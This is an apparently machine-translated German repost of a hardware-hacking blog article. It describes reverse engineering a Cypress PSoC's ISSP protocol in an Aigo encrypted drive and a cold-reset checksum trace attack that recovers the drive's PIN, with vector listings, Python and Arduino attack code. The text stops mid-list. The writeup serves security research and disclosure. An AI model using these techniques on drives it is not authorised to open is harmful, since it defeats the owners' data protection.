<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëãüèø üë®üèΩ‚Äç‚öïÔ∏è ‚èÆÔ∏è Umkehren und Hacken der selbstverschl√ºsselenden externen Festplatte von Aigo. Teil 2: Dumping mit Cypress PSoC ‚ÜïÔ∏è üíí üìÅ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Dies ist der zweite und letzte Teil des Artikels √ºber das Hacken externer selbstverschl√ºsselnder Laufwerke. Ich erinnere Sie daran, dass mir ein Kolle...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Umkehren und Hacken der selbstverschl√ºsselenden externen Festplatte von Aigo. Teil 2: Dumping mit Cypress PSoC</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/455529/"><p>  Dies ist der zweite und letzte Teil des Artikels √ºber das Hacken externer selbstverschl√ºsselnder Laufwerke.  Ich erinnere Sie daran, dass mir ein Kollege k√ºrzlich eine Patriot (Aigo) SK8671-Festplatte gebracht hat, und ich habe beschlossen, sie umzukehren. Jetzt teile ich mit, was daraus geworden ist.  Lesen Sie unbedingt den <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">ersten Teil des</a> Artikels, bevor Sie weiterlesen. </p><br><p> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">4. Wir beginnen, den Speicherauszug vom internen Flash-Laufwerk PSoC zu entfernen</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">5. ISSP-Protokoll</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">- 5.1.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Was ist ein ISSP?</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">- 5.2.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Entmystifizierung von Vektoren</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">- 5.3.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Chatte mit PSoC</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">- 5.4.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Identifizierung von Intra-Chip-Registern</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">- 5.5.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Schutzbits</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">6. Erster (fehlgeschlagener) Angriff: ROMX</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">7. Zweiter Angriff: Trace mit Kaltstart</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">- 7.1.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Implementierung</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">- 7.2.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Lesen Sie das Ergebnis</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">- 7.3.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Rekonstruktion der Flash-Bin√§rdatei</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">- 7.4.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Suchen Sie die Pincode-Speicheradresse</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">- 7.5.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Wir entfernen den Dump von Block Nr. 126</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">- 7.6.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Pincode-Wiederherstellung</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">8. Was kommt als n√§chstes?</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">9. Fazit</a> </p><br><p><img src="https://habrastorage.org/webt/wx/nm/gk/wxnmgkeurrmiurx87rujoynxrsq.jpeg"></p><a name="habracut"></a><br><a name="a4"></a><br><h1 id="4-nachinaem-snimat-damp-s-vnutrenney-fleshki-psoc">  4. Wir beginnen, den Speicherauszug vom internen Flash-Laufwerk PSoC zu entfernen </h1><br><p>  Alles deutet also darauf hin (wie wir in [dem ersten Teil] () festgestellt haben), dass der PIN-Code im PSoC-Flash-Darm gespeichert ist.  Deshalb m√ºssen wir diese Blitzd√§rme lesen.  Vor der notwendigen Arbeit: </p><br><ul><li>  die Kontrolle √ºber die "Kommunikation" mit dem Mikrocontroller √ºbernehmen; </li><li>  einen Weg finden, um zu √ºberpr√ºfen, ob diese "Kommunikation" vor dem Lesen von au√üen gesch√ºtzt ist; </li><li>  einen Weg finden, um die Sicherheit zu umgehen. </li></ul><br><p>  Es gibt zwei Stellen, an denen es sinnvoll ist, nach einem g√ºltigen PIN-Code zu suchen: </p><br><ul><li>  interner Flash-Speicher; </li><li>  SRAM, in dem der PIN-Code gespeichert werden kann, um ihn mit dem vom Benutzer eingegebenen PIN-Code zu vergleichen. </li></ul><br><p>  Mit Blick auf die Zukunft stelle ich fest, dass es mir immer noch gelungen ist, den Speicherauszug des internen Flash-Laufwerks PSoC unter Umgehung seines Schutzsystems mithilfe des Hardwareangriffs "Cold Reset Trace" zu entfernen, nachdem die undokumentierten Funktionen des ISSP-Protokolls umgekehrt wurden.  Dadurch konnte ich den aktuellen PIN-Code direkt ausgeben. </p><br><pre><code class="plaintext hljs">$ ./psoc.py syncing: KO OK [...] PIN: 1 2 3 4 5 6 7 8 9</code> </pre> <br><p>  Der resultierende Programmcode: </p><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Arduino-Code f√ºr HSSP</a> ; </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Python-Treiber und ISSP-Disassembler</a> . </li></ul><br><a name="a5"></a><br><h1 id="5-issp-protokol">  5. ISSP-Protokoll </h1><br><a name="a51"></a><br><h2 id="51-chto-takoe-issp">  5.1.  Was ist ein ISSP? </h2><br><p>  "Kommunikation" mit dem Mikrocontroller kann verschiedene Bedeutungen haben: von "Anbieter zu Anbieter" bis zur Interaktion √ºber ein serielles Protokoll (z. B. ICSP f√ºr den PIC von Microchip). </p><br><p>  Cypress verf√ºgt hierf√ºr √ºber ein eigenes Protokoll namens ISSP (In-System Serial Programming Protocol), das teilweise in der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">technischen Spezifikation beschrieben ist</a> .  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">US7185162</a> bietet auch einige Informationen.  Es gibt auch ein OpenSource-Analogon namens HSSP (wir werden es etwas sp√§ter verwenden).  ISSP funktioniert wie folgt: </p><br><ul><li>  PSoC neu starten; </li><li>  Bringen Sie die magische Nummer in den seriellen Datenbereich dieses PSoC.  externen Programmiermodus aufrufen; </li><li>  Senden Sie Befehle, bei denen es sich um lange Bitfolgen handelt, die als "Vektoren" bezeichnet werden. </li></ul><br><p>  In der ISSP-Dokumentation werden diese Vektoren nur f√ºr eine kleine Handvoll Befehle definiert: </p><br><ul><li>  Initialisieren Sie-1 </li><li>  Initialize-2 </li><li>  Initialize-3 (3V- und 5V-Optionen) </li><li>  ID-SETUP </li><li>  READ-ID-WORD </li><li>  SET-BLOCK-NUM: 10011111010dddddddd111, wobei dddddddd = block # </li><li>  BULK ERASE </li><li>  PROGRAMMBLOCK </li><li>  √úBERPR√úFEN-SETUP </li><li>  READ-BYTE: 10110aaaaaaZDDDDDDDDZ1, wobei DDDDDDDDD = Datenausgang, aaaaaa = Adresse (6 Bit) </li><li>  WRITE-BYTE: 10010aaaaaadddddddd111, wobei dddddddd = Daten in, aaaaaa = Adresse (6 Bit) </li><li>  Sicher </li><li>  CHECKSUM-SETUP </li><li>  READ-CHECKSUM: 10111111001ZDDDDDDDDDZ110111111000ZDDDDDDDZ1, wobei DDDDDDDDDDDDDDD = Datenausgang: Ger√§tepr√ºfsumme </li><li>  BLOCK L√ñSCHEN </li></ul><br><p>  Zum Beispiel der Vektor f√ºr Initialize-2: </p><br><pre> <code class="plaintext hljs">1101111011100000000111 1101111011000000000111 1001111100000111010111 1001111100100000011111 1101111010100000000111 1101111010000000011111 1001111101110000000111 1101111100100110000111 1101111101001000000111 1001111101000000001111 1101111000000000110111 1101111100000000000111 1101111111100010010111</code> </pre> <br><p>  Alle Vektoren haben die gleiche L√§nge: 22 Bit.  Die HSSP-Dokumentation enth√§lt einige zus√§tzliche Informationen zu ISSPs: ‚ÄûEin ISSP-Vektor ist nichts anderes als eine Bitfolge, die einen Befehlssatz darstellt.‚Äú </p><br><a name="a52"></a><br><h2 id="52-demistifikaciya-vektorov">  5.2.  Entmystifizierung von Vektoren </h2><br><p>  Mal sehen, was hier passiert.  Anfangs nahm ich an, dass dieselben Vektoren Rohvarianten der M8C-Anweisungen sind. Nachdem ich diese Hypothese getestet hatte, stellte ich fest, dass die Opcodes der Operationen nicht √ºbereinstimmen. </p><br><p>  Dann habe ich den obigen Vektor gegoogelt und bin auf <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">diese</a> Studie gesto√üen, in der der Autor, obwohl er nicht auf Details eingeht, einige praktische Hinweise gibt: ‚ÄûJede Anweisung beginnt mit drei Bits, die einer der vier Mnemoniken entsprechen (aus dem RAM lesen, in den RAM schreiben) , das Register lesen, das Register schreiben).  Dann kommt die 8-Bit-Adresse, gefolgt von 8 Datenbits (entweder gelesen oder geschrieben) und schlie√ülich drei Stoppbits. ‚Äú </p><br><p>  Dann konnte ich einige sehr n√ºtzliche Informationen aus dem Abschnitt Supervisory ROM (SROM) des <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">technischen Handbuchs</a> sammeln.  SROM ist ein fest codiertes ROM in PSoC, das Servicefunktionen (√§hnlich wie Syscall) f√ºr Software-Code bereitstellt, der im Benutzerbereich ausgef√ºhrt wird: </p><br><ul><li>  00h: SWBootReset </li><li>  01h: ReadBlock </li><li>  02h: WriteBlock </li><li>  03h: EraseBlock </li><li>  06h: TableRead </li><li>  07h: CheckSum </li><li>  08h: Calibrate0 </li><li>  09h: Kalibrieren1 </li></ul><br><p>  Durch den Vergleich von Vektornamen mit SROM-Funktionen k√∂nnen wir die verschiedenen von diesem Protokoll unterst√ºtzten Operationen den erwarteten SROM-Parametern zuordnen.  Dank dessen k√∂nnen wir die ersten drei Bits von ISSP-Vektoren decodieren: </p><br><ul><li>  100 =&gt; "wrmem" </li><li>  101 =&gt; "rdmem" </li><li>  110 =&gt; "wrreg" </li><li>  111 =&gt; "rdreg" </li></ul><br><p>  Ein umfassendes Verst√§ndnis der Intra-Chip-Prozesse kann jedoch nur durch direkte Kommunikation mit PSoC erreicht werden. </p><br><a name="a53"></a><br><h2 id="53-obschenie-s-psoc">  5.3.  Chatte mit PSoC </h2><br><p>  Da Dirk Petrautsky <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">den</a> Cypress HSSP-Code bereits nach Arduino <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">portiert</a> hat, habe ich Arduino Uno verwendet, um die Tastaturplatine mit dem ISSP-Anschluss zu verbinden. </p><br><p>  Bitte beachten Sie, dass ich w√§hrend meiner Recherche den Dirk-Code ziemlich ge√§ndert habe.  Sie finden meine √Ñnderung auf GitHub: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Hier ist das</a> entsprechende Python-Skript f√ºr die Kommunikation mit Arduino in meinem Repository <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">cypress_psoc_tools</a> . </p><br><p>  Bei Verwendung von Arduino habe ich zun√§chst nur "offizielle" Vektoren f√ºr "Kommunikation" verwendet.  Ich habe versucht, das interne ROM mit dem Befehl VERIFY zu lesen.  Wie erwartet konnte ich das nicht tun.  Wahrscheinlich aufgrund der Tatsache, dass Leseschutzbits im Flash-Laufwerk aktiviert sind. </p><br><p>  Dann habe ich einige meiner einfachen Vektoren zum Schreiben und Lesen von Speicher / Registern erstellt.  Bitte beachten Sie, dass wir das gesamte SROM lesen k√∂nnen, obwohl das Flash-Laufwerk gesch√ºtzt ist! </p><br><a name="a54"></a><br><h2 id="54-identifikaciya-vnutrichipovyh-registrov">  5.4.  Identifizierung von Intra-Chip-Registern </h2><br><p>  Bei der Betrachtung der "zerlegten" Vektoren stellte ich fest, dass das Ger√§t undokumentierte Register (0xF8-0xFA) verwendet, um M8C-Opcodes anzuzeigen, die direkt ausgef√ºhrt werden und den Schutz umgehen.  Dadurch konnte ich verschiedene Opcodes wie "ADD", "MOV A, X", "PUSH" oder "JMP" ausf√ºhren.  Dank ihnen (unter Ber√ºcksichtigung der Nebenwirkungen, die sie auf die Register haben) konnte ich feststellen, welche der nicht dokumentierten Register tats√§chlich regul√§re Register sind (A, X, SP und PC). </p><br><p>  Infolgedessen sieht der vom Tool HSSP_disas.rb generierte "disassemblierte" Code folgenderma√üen aus (aus Gr√ºnden der √úbersichtlichkeit habe ich Kommentare hinzugef√ºgt): </p><br><pre> <code class="plaintext hljs">--== init2 ==-- [DE E0 1C] wrreg CPU_F (f7), 0x00 #   [DE C0 1C] wrreg SP (f6), 0x00 #  SP [9F 07 5C] wrmem KEY1, 0x3A #    SSC [9F 20 7C] wrmem KEY2, 0x03 #  [DE A0 1C] wrreg PCh (f5), 0x00 #  PC (MSB) ... [DE 80 7C] wrreg PCl (f4), 0x03 # (LSB) ...  3 ?? [9F 70 1C] wrmem POINTER, 0x80 # RAM-    [DF 26 1C] wrreg opc1 (f9), 0x30 #  1 =&gt; "HALT" [DF 48 1C] wrreg opc2 (fa), 0x40 #  2 =&gt; "NOP" [9F 40 3C] wrmem BLOCKID, 0x01 # BLOCK ID   SSC [DE 00 DC] wrreg A (f0), 0x06 #  "Syscall" : TableRead [DF 00 1C] wrreg opc0 (f8), 0x00 #   SSC, "Supervisory SROM Call" [DF E2 5C] wrreg CPU_SCR0 (ff), 0x12 #  :   </code> </pre> <br><a name="a55"></a><br><h2 id="55-zaschitnye-bity">  5.5.  Schutzbits </h2><br><p>  Zu diesem Zeitpunkt kann ich bereits mit PSoC kommunizieren, habe jedoch noch keine zuverl√§ssigen Informationen zu den Schutzbits des Flash-Laufwerks.  Ich war sehr √ºberrascht von der Tatsache, dass Cypress dem Ger√§tebenutzer keine M√∂glichkeit bietet, zu √ºberpr√ºfen, ob der Schutz aktiviert ist.  Ich ging tief in Google ein, um endlich zu verstehen, dass der von Cypress bereitgestellte HSSP-Code aktualisiert wurde, nachdem Dirk seine √Ñnderung ver√∂ffentlicht hatte.  Und los geht's!  Hier ist ein neuer Vektor wie dieser: </p><br><pre> <code class="plaintext hljs">[DE E0 1C] wrreg CPU_F (f7), 0x00 [DE C0 1C] wrreg SP (f6), 0x00 [9F 07 5C] wrmem KEY1, 0x3A [9F 20 7C] wrmem KEY2, 0x03 [9F A0 1C] wrmem 0xFD, 0x00 #   [9F E0 1C] wrmem 0xFF, 0x00 #  [DE A0 1C] wrreg PCh (f5), 0x00 [DE 80 7C] wrreg PCl (f4), 0x03 [9F 70 1C] wrmem POINTER, 0x80 [DF 26 1C] wrreg opc1 (f9), 0x30 [DF 48 1C] wrreg opc2 (fa), 0x40 [DE 02 1C] wrreg A (f0), 0x10 #  syscall ! [DF 00 1C] wrreg opc0 (f8), 0x00 [DF E2 5C] wrreg CPU_SCR0 (ff), 0x12</code> </pre> <br><p>  Mit diesem Vektor (siehe read_security_data in psoc.py) erhalten wir alle Schutzbits im SRAM bei 0x80, wobei jedes Bit mit zwei Bits gesch√ºtzt ist. </p><br><p>  Das Ergebnis ist deprimierend: Im Modus "Externes Lesen und Schreiben deaktivieren" ist alles gesch√ºtzt.  Daher k√∂nnen wir nicht nur etwas vom USB-Stick lesen, sondern auch schreiben (zum Beispiel, um dort einen ROM-Dumper einzuf√ºhren).  Die einzige M√∂glichkeit, den Schutz zu deaktivieren, besteht darin, den gesamten Chip vollst√§ndig zu l√∂schen.  :-( </p><br><a name="a6"></a><br><h1 id="6-pervaya-neudavshayasya-ataka-romx">  6. Erster (fehlgeschlagener) Angriff: ROMX </h1><br><p>  Wir k√∂nnen jedoch den folgenden Trick ausprobieren: Da wir beliebige Opcodes ausf√ºhren k√∂nnen, k√∂nnen Sie ROMX ausf√ºhren, das zum Lesen des Flash-Speichers verwendet wird.  Dieser Ansatz hat gute Erfolgschancen.  Da die ReadBlock-Funktion, die Daten aus dem SROM liest (das von Vektoren verwendet wird), pr√ºft, ob sie vom ISSP aufgerufen werden.  Vermutlich hat der ROMX-Opcode jedoch keine solche Pr√ºfung.  Hier ist also der Python-Code (nachdem dem Arduino C-Code einige Hilfsklassen hinzugef√ºgt wurden): </p><br><pre> <code class="plaintext hljs">for i in range(0, 8192): write_reg(0xF0, i&gt;&gt;8) # A = 0 write_reg(0xF3, i&amp;0xFF) # X = 0 exec_opcodes("\x28\x30\x40") # ROMX, HALT, NOP byte = read_reg(0xF0) # ROMX reads ROM[A|X] into A print "%02x" % ord(byte[0]) # print ROM byte</code> </pre> <br><p>  Leider funktioniert dieser Code nicht.  :-( Es funktioniert eher, aber am Ausgang erhalten wir unsere eigenen Opcodes (0x28 0x30 0x40)! Ich glaube nicht, dass die entsprechende Funktionalit√§t des Ger√§ts ein Element des Leseschutzes ist. Dies ist eher ein technischer Trick: Bei der Ausf√ºhrung externer Opcodes wird der ROM-Bus umgeleitet zu einem tempor√§ren Puffer. </p><br><a name="a7"></a><br><h1 id="7-vtoraya-ataka-trassirovka-s-holodnoy-perezagruzkoy">  7. Zweiter Angriff: Trace mit Kaltstart </h1><br><p>  Da der ROMX-Trick nicht funktionierte, begann ich √ºber eine andere Variante dieses Tricks nachzudenken - beschrieben in der Ver√∂ffentlichung <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">"Zu viel Licht auf den Firmware-Schutz eines Mikrocontrollers werfen"</a> . </p><br><a name="a71"></a><br><h2 id="71-realizaciya">  7.1.  Implementierung </h2><br><p>  Der folgende Vektor f√ºr CHECKSUM-SETUP ist in der ISSP-Dokumentation aufgef√ºhrt: </p><br><pre> <code class="plaintext hljs">[DE E0 1C] wrreg CPU_F (f7), 0x00 [DE C0 1C] wrreg SP (f6), 0x00 [9F 07 5C] wrmem KEY1, 0x3A [9F 20 7C] wrmem KEY2, 0x03 [DE A0 1C] wrreg PCh (f5), 0x00 [DE 80 7C] wrreg PCl (f4), 0x03 [9F 70 1C] wrmem POINTER, 0x80 [DF 26 1C] wrreg opc1 (f9), 0x30 [DF 48 1C] wrreg opc2 (fa), 0x40 [9F 40 1C] wrmem BLOCKID, 0x00 [DE 00 FC] wrreg A (f0), 0x07 [DF 00 1C] wrreg opc0 (f8), 0x00 [DF E2 5C] wrreg CPU_SCR0 (ff), 0x12</code> </pre> <br><p>  Hier wird im Wesentlichen die SROM-Funktion 0x07 aufgerufen, wie in der Dokumentation dargestellt (meine kursiv): </p><br><blockquote>  Diese Funktion Pr√ºfsumme Pr√ºfsumme.  Es berechnet eine 16-Bit-Pr√ºfsumme der Anzahl der vom Benutzer in einer Flash-Bank festgelegten Bl√∂cke, wobei von Null aus gez√§hlt wird.  Mit dem Parameter BLOCKID wird die Anzahl der Bl√∂cke √ºbertragen, die bei der Berechnung der Pr√ºfsumme verwendet werden.  Ein Wert von "1" berechnet die Pr√ºfsumme nur f√ºr den Nullblock.  w√§hrend <em>"0" dazu f√ºhrt, dass die Gesamtpr√ºfsumme aller 256 Bl√∂cke der Flash-Bank berechnet wird.</em>  <em>Eine 16-Bit-Pr√ºfsumme wird √ºber KEY1 und KEY2 zur√ºckgegeben.</em>  In Parameter KEY1 sind die niedrigen 8 Bits der Pr√ºfsumme festgelegt, und in KEY2 werden die hohen 8 Bits aufgezeichnet.  Bei Ger√§ten mit mehreren Flash-B√§nken wird die Pr√ºfsummenfunktion f√ºr jedes einzeln aufgerufen.  Die Banknummer, mit der es arbeiten wird, wird durch das Register FLS_PR1 eingestellt (indem ein Bit entsprechend der Ziel-Flash-Bank gesetzt wird). </blockquote><p>  Beachten Sie, dass dies die einfachste Pr√ºfsumme ist: Bytes werden einfach einzeln summiert.  Keine ausgekl√ºgelten CRC-Macken.  Da ich wusste, dass der Registersatz im M8C-Kern sehr klein ist, ging ich davon aus, dass bei der Berechnung der Pr√ºfsumme die Zwischenwerte in denselben Variablen festgelegt werden, die schlie√ülich ausgegeben werden: KEY1 (0xF8) / KEY2 (0xF9). </p><br><p>  Theoretisch sieht mein Angriff also so aus: </p><br><ol><li>  Stellen Sie eine Verbindung √ºber ISSP her. </li><li>  Wir starten die Berechnung der Pr√ºfsumme mit dem Vektor CHECKSUM-SETUP. </li><li>  Wir starten den Prozessor nach der angegebenen Zeit T neu. </li><li>  Lesen Sie den RAM, um die aktuelle Pr√ºfsumme C zu erhalten. </li><li>  Wiederholen Sie die Schritte 3 und 4 jedes Mal, wenn Sie T erh√∂hen. </li><li>  Wir stellen Daten vom Flash-Laufwerk wieder her, indem wir die vorherige Pr√ºfsumme C von der aktuellen subtrahieren. </li></ol><br><p>  Es trat jedoch ein Problem auf: Der Initialize-1-Vektor, den wir nach dem Neustart senden m√ºssen, √ºberschreibt KEY1 und KEY2: </p><br><pre> <code class="plaintext hljs">1100101000000000000000 # ,  PSoC    nop nop nop nop nop [DE E0 1C] wrreg CPU_F (f7), 0x00 [DE C0 1C] wrreg SP (f6), 0x00 [9F 07 5C] wrmem KEY1, 0x3A #     [9F 20 7C] wrmem KEY2, 0x03 #   [DE A0 1C] wrreg PCh (f5), 0x00 [DE 80 7C] wrreg PCl (f4), 0x03 [9F 70 1C] wrmem POINTER, 0x80 [DF 26 1C] wrreg opc1 (f9), 0x30 [DF 48 1C] wrreg opc2 (fa), 0x40 [DE 01 3C] wrreg A (f0), 0x09 # SROM- 9 [DF 00 1C] wrreg opc0 (f8), 0x00 # SSC [DF E2 5C] wrreg CPU_SCR0 (ff), 0x12</code> </pre> <br><p>  Dieser Code √ºberschreibt unsere wertvolle Pr√ºfsumme durch Aufrufen von Calibrate1 (SROM-Funktion 9) ... Vielleicht k√∂nnen wir einfach in den Programmiermodus wechseln, indem wir die magische Nummer (ab dem Anfang des obigen Codes) senden und dann SRAM lesen?  Und ja, es funktioniert!  Der Arduino-Code, der diesen Angriff implementiert, ist ziemlich einfach: </p><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">case</span></span> Cmnd_STK_START_CSUM: checksum_delay = ((<span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span>)getch())&lt;&lt;<span class="hljs-number"><span class="hljs-number">24</span></span>; checksum_delay |= ((<span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span>)getch())&lt;&lt;<span class="hljs-number"><span class="hljs-number">16</span></span>; checksum_delay |= ((<span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span>)getch())&lt;&lt;<span class="hljs-number"><span class="hljs-number">8</span></span>; checksum_delay |= getch(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(checksum_delay &gt; <span class="hljs-number"><span class="hljs-number">10000</span></span>) { ms_delay = checksum_delay/<span class="hljs-number"><span class="hljs-number">1000</span></span>; checksum_delay = checksum_delay%<span class="hljs-number"><span class="hljs-number">1000</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { ms_delay = <span class="hljs-number"><span class="hljs-number">0</span></span>; } send_checksum_v(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(checksum_delay) delayMicroseconds(checksum_delay); delay(ms_delay); start_pmode();</code> </pre> <br><ol><li>  Lesen Sie checkum_delay. </li><li>  F√ºhren Sie die Pr√ºfsummenberechnung aus (send_checksum_v). </li><li>  Warten Sie einen bestimmten Zeitraum.  angesichts der folgenden Fallstricke: <br><ul><li>  Ich habe viel Zeit 